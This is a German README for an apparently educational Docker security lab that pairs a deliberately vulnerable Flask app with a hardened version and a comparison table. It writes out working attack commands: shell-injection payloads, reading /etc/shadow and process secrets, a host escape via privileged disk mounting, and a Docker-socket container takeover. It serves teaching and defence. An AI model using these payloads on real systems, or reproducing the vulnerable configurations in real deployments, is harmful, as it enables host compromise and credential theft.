# Docker Container Security — Lehrprojekt

Dieses Projekt demonstriert typische Sicherheitsschwachstellen in Docker-Container-Umgebungen
sowie deren Gegenmaßnahmen. Es enthält eine absichtlich verwundbare Web-Applikation und eine
gehärtete Vergleichsversion, sodass Angriffsvektoren praktisch nachvollzogen werden können.

> **Hinweis:** Dieses Setup enthält absichtliche Schwachstellen und dient ausschließlich
> zu Bildungszwecken. Niemals in einer Produktionsumgebung einsetzen.

---

## Voraussetzungen

- Docker Engine ≥ 20.x oder Docker Desktop ≥ 4.x
- Docker Compose v2
- Linux-Host empfohlen (Container Escape und Docker-Socket-Angriffe sind unter Docker Desktop
  auf macOS/Windows eingeschränkt, alle anderen Schwachstellen funktionieren plattformübergreifend)

---

## Architektur

```
                        Internet / Browser
                               |
                           Port 5001
                               |
                     ┌─────────▼─────────┐
                     │  webapp (Flask)    │  ← verwundbar: root, privileged,
                     │  frontend-Netz     │    docker.sock, keine Validierung
                     │  + backend-Netz    │
                     └────────┬──────────┘
                              │ backend-Netz (unsegmentiert)
               ┌──────────────┼──────────────┐
               │                             │
      ┌────────▼────────┐         ┌──────────▼────────┐
      │  db (MySQL 8.0) │         │  admin-service     │
      │  Passwort: root │         │  Port 8080         │
      │  (kein Auth)    │         │  (API-Keys offen)  │
      └─────────────────┘         └────────────────────┘
```

---

## Schnellstart

### Verwundbare Version starten

```bash
docker compose up -d --build
```

Ca. 30 Sekunden warten (MySQL-Initialisierung), dann im Browser öffnen:
**http://localhost:5001**

### Gehärtete Version starten (zum Vergleich)

```bash
docker compose down
docker compose -f docker-compose.hardened.yml up -d --build
```

**http://localhost:5001** (erkennbar am grünen Design)

### Aufräumen

```bash
docker compose down
# oder für die gehärtete Version:
docker compose -f docker-compose.hardened.yml down
```

---

## Projektstruktur

```
docker-container-security/
├── docker-compose.yml              ← Verwundbare Umgebung
├── docker-compose.hardened.yml     ← Gehärtete Umgebung
├── init.sql                        ← Testdatenbank mit Kundendaten
├── webapp/
│   ├── Dockerfile                  ← Verwundbares Image (root, Tools, Layer-Secrets)
│   ├── Dockerfile.hardened         ← Gehärtetes Image (non-root, minimal)
│   ├── app.py                      ← Verwundbare Flask-App (Command Injection)
│   └── app_hardened.py             ← Gehärtete Flask-App
└── admin-service/
    ├── Dockerfile
    └── app.py                      ← Interner Service mit simulierten API-Keys
```

---

## Demonstrierte Schwachstellen

### 1. Command Injection

**Ursache:** Die Nutzereingabe im Ping-Formular wird ohne Validierung direkt in einen
Shell-Befehl eingebettet (`subprocess.run(..., shell=True)`).

**Angriff:** Im Ping-Feld der Web-Oberfläche eingeben:

```
8.8.8.8; whoami
```

Ausgabe: `root` — der Angreifer führt beliebige Befehle als Root im Container aus.

Weitere Beispiele:
```
8.8.8.8; id
8.8.8.8; cat /etc/passwd
8.8.8.8; cat /proc/1/cgroup    ← bestätigt: wir sind in einem Docker-Container
```

**Ort:** `webapp/app.py` → `/ping`-Endpoint

---

### 2. Lateral Movement

**Ursache:** Die Webapp ist gleichzeitig im `frontend`- und `backend`-Netz. Dadurch kann
ein Angreifer, der die Webapp kompromittiert hat, alle internen Dienste über Docker-DNS
direkt erreichen.

**Angriff:** Nach erfolgreicher Command Injection:

```bash
# Admin-Service mit API-Keys abfragen (über Docker-DNS erreichbar):
; curl -s http://admin:8080/api/config

# Datenbank mit schwachem Passwort direkt abfragen:
; mysql -h db -u root -proot -e "SELECT * FROM kundenportal.kunden"
```

Ausgabe: AWS-Keys, Admin-Zugangsdaten, vollständige Kundendaten inkl. Kreditkarteninformationen.

**Ort:** Netzwerkkonfiguration in `docker-compose.yml`

---

### 3. Container Escape (Privileged Mode)

**Ursache:** Der Container läuft mit `privileged: true`. Das gibt dem Container uneingeschränkten
Zugriff auf alle Linux-Kernel-Features des Hosts, einschließlich der Fähigkeit, Host-Devices
einzuhängen.

**Angriff:**

```bash
# Prüfen ob privilegiert (Festplatten sichtbar = privilegiert):
; fdisk -l 2>/dev/null | head -10

# Verfügbare Block-Devices anzeigen:
; lsblk

# Host-Dateisystem einhängen und auslesen:
; mkdir -p /mnt/host && mount /dev/sda1 /mnt/host 2>/dev/null; ls /mnt/host/
; cat /mnt/host/etc/hostname
; cat /mnt/host/etc/shadow | head -5
```

Ergebnis: Vollständiger Lesezugriff auf das Host-Dateisystem — der Container ist ausgebrochen.

> **Hinweis:** Device-Name kann variieren (sda1, vda1, xvda1). `lsblk` zeigt den richtigen Namen.
> Unter Docker Desktop (macOS/Windows) ist das Host-System die VM, nicht der Mac/Windows-Rechner.

**Ort:** `docker-compose.yml` → `privileged: true`

---

### 4. Secrets in Umgebungsvariablen

**Ursache:** Passwörter und API-Keys werden als Environment-Variablen an den Container
übergeben. Diese sind für jeden Prozess im Container über `/proc/1/environ` lesbar —
und werden in `docker inspect` im Klartext angezeigt.

**Angriff:**

```bash
# Alle Umgebungsvariablen des Containers auslesen:
; cat /proc/1/environ | tr '\0' '\n'

# Alternativ von außen (als Docker-Host):
docker inspect webapp-container-name | grep -A5 '"Env"'
```

Ausgabe: `DB_PASSWORD=root`, `SECRET_API_KEY=sk-prod-...`, `JWT_SECRET=...`

**Ort:** `docker-compose.yml` → `environment:`-Block der webapp

---

### 5. Secrets in Image-Layern (Docker History)

**Ursache:** Passwörter oder Zugangsdaten, die in einem `RUN`-Befehl im Dockerfile verwendet
werden, bleiben in der Image-History gespeichert — auch wenn sie in einem späteren Layer
wieder gelöscht werden. Über `docker history` sind sie rekonstruierbar.

**Angriff:**

```bash
# Image-History mit vollständigen Befehlen anzeigen:
docker history --no-trunc docker-container-security-webapp

# Oder aus dem laufenden Container:
; cat /etc/environment
```

Ausgabe: `BACKUP_DB_URL=mysql://backup_user:Backup@2024!@db-prod.firma.local/kundenportal`

**Ort:** `webapp/Dockerfile` → `RUN echo "BACKUP_DB_URL=..." >> /etc/environment`

---

### 6. Docker Socket Exposure

**Ursache:** Die Datei `/var/run/docker.sock` ist in den Container eingebunden. Über diesen
Unix-Socket spricht die Docker CLI mit dem Docker-Daemon. Zugriff darauf entspricht
Root-Zugriff auf den Host — ein Angreifer kann beliebige Container starten, stoppen und
den Host vollständig übernehmen.

**Angriff:**

```bash
# Laufende Container über Docker-API auflisten:
; curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | python3 -m json.tool

# Neuen privilegierten Container starten und Host-Root mounten:
; curl -s --unix-socket /var/run/docker.sock \
    -X POST \
    -H "Content-Type: application/json" \
    -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/etc/shadow"],"Binds":["/:/host"],"Privileged":true}' \
    "http://localhost/containers/create?name=escape"

# Container starten:
; curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/escape/start

# Logs (Ausgabe des Befehls) lesen:
; curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/escape/logs?stdout=1"
```

Ergebnis: Vollständiger Host-Zugriff, unabhängig von `--privileged` oder Capabilities — allein
durch den Socket-Mount.

**Ort:** `docker-compose.yml` → `volumes: - /var/run/docker.sock:/var/run/docker.sock`

---

## Härtungsmaßnahmen (Vergleich)

| Schwachstelle | Verwundbar | Gehärtet |
|---|---|---|
| Input-Validierung | keine (`shell=True`) | Regex-Whitelist, Liste als Argumente |
| Container-User | `root` | `appuser` (non-root) |
| Privileged Mode | `privileged: true` | nicht gesetzt |
| Linux Capabilities | alle | `cap_drop: ALL` |
| Privilege Escalation | möglich | `no-new-privileges: true` |
| Netzwerksegmentierung | webapp in frontend + backend | webapp nur in frontend |
| Backend-Netz | erreichbar von außen | `internal: true` |
| Filesystem | beschreibbar | `read_only: true` + `/tmp` als tmpfs |
| Datenbankpasswort | `root` | starkes Zufallspasswort |
| Docker Socket | gemountet | nicht exponiert |
| Secrets | in Env-Vars und Image-Layern | (außerhalb des Scopes: Docker Secrets / Vault) |

---

## Troubleshooting

- **MySQL startet nicht?** → `docker compose logs db` prüfen, ggf. 60 Sekunden warten
- **Port 5001 belegt?** → In `docker-compose.yml` den Port ändern (z.B. `5002:5000`)
- **Container Escape klappt nicht?** → `; lsblk` zeigt den richtigen Device-Namen. Unter Docker Desktop ist der Escape auf die interne VM beschränkt
- **Docker Socket nicht erreichbar?** → `ls -la /var/run/docker.sock` im Container prüfen; Socket muss existieren und lesbar sein
